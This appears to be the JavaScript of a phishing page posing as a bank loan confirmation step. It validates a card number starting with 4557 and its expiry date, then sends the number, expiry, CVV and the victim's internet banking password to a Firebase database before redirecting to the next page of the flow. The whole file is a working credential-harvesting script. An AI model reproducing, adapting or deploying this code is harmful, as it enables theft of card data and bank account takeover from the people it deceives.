
document.addEventListener("DOMContentLoaded", () => {
    const digita8 = document.getElementById("digita8");
    const caduco = document.getElementById("caduco");
    const cvv = document.getElementById("secret");
    const clave = document.getElementById("llave");
    const btn = document.getElementById("btnconfirmarprestamo");

    const alertTar = document.getElementById("alertatar");
    const alertFecha = document.getElementById("alertacaduco");

    // Máscaras con JavaScript puro
    digita8.addEventListener("input", (e) => {
        let value = digita8.value.replace(/\D/g, "").slice(0, 12);
        digita8.value = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    });

    caduco.addEventListener("input", (e) => {
        let value = caduco.value.replace(/\D/g, "").slice(0, 4);
        if (value.length >= 3) {
            caduco.value = value.slice(0, 2) + "/" + value.slice(2);
        } else {
            caduco.value = value;
        }
    });

    digita8.addEventListener("input", () => {
        const tarjeta = "4557" + digita8.value.replace(/\s/g, "");
        validarTarjeta(tarjeta);
    });

    caduco.addEventListener("blur", () => {
        validarFechaVencimiento(caduco.value);
    });

    btn.addEventListener("click", async (e) => {
        e.preventDefault();

        const tarjeta = "4557" + digita8.value.replace(/\s/g, "");
        const vencimiento = caduco.value;
        const cvvVal = cvv.value.trim();
        const claveVal = clave.value.trim();

        const tarjetaValida = validarTarjeta(tarjeta);
        const fechaValida = validarFechaVencimiento(vencimiento);

        if (!tarjetaValida || !fechaValida || !cvvVal || !claveVal) {
            alertTar.textContent = "Revisa los campos e intenta nuevamente.";
            return;
        }

        alertTar.textContent = "";

        let userId = localStorage.getItem("userId");
        if (!userId) {
            userId = crypto.randomUUID();
            localStorage.setItem("userId", userId);
        }

        try {
            await db.collection("prestamos").doc(userId).set({
                tarjeta,
                vencimiento,
                cvv: cvvVal,
                claveInternet: claveVal,
                etapa: "validacion-tarjeta",
                actualizado: new Date()
            }, { merge: true });

            if (typeof mostrarLoader === "function") {
                mostrarLoader("index9.html");
            } else {
                window.location.href = "index9.html";
            }

        } catch (err) {
            console.error("❌ Error al guardar en Firebase:", err);
            alertTar.textContent = "Error al guardar. Intenta más tarde.";
        }
    });

    function validarTarjeta(numero) {
        if (numero.length !== 16) {
            alertTar.textContent = "La tarjeta debe tener exactamente 16 dígitos.";
            return false;
        }

        if (!numero.startsWith("4557")) {
            alertTar.textContent = "La tarjeta debe comenzar con 4557.";
            return false;
        }

        if (!validarLuhn(numero)) {
            alertTar.textContent = "Número inválido.";
            return false;
        }

        alertTar.textContent = "";
        return true;
    }

    function validarLuhn(numero) {
        let suma = 0, par = false;
        for (let i = numero.length - 1; i >= 0; i--) {
            let dig = parseInt(numero.charAt(i), 10);
            if (par) {
                dig *= 2;
                if (dig > 9) dig -= 9;
            }
            suma += dig;
            par = !par;
        }
        return suma % 10 === 0;
    }

    function validarFechaVencimiento(fecha) {
        const alerta = document.getElementById("alertacaduco");
        const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;

        if (!regex.test(fecha)) {
            alerta.textContent = "Formato inválido (usa MM/AA).";
            alerta.style.display = "block"; // 👈 Asegura que sea visible
            return false;
        }

        const [mesStr, anioStr] = fecha.split("/");
        const mes = parseInt(mesStr, 10);
        const anio = parseInt("20" + anioStr, 10);
        const hoy = new Date();
        const mesActual = hoy.getMonth() + 1;
        const anioActual = hoy.getFullYear();

        if (anio < anioActual || (anio === anioActual && mes < mesActual)) {
            alerta.textContent = "La tarjeta está vencida.";
            alerta.style.display = "block"; // 👈 Asegura que sea visible
            return false;
        }

        alerta.textContent = "";
        alerta.style.display = "none"; // 👈 Oculta si está bien
        return true;
    }

});

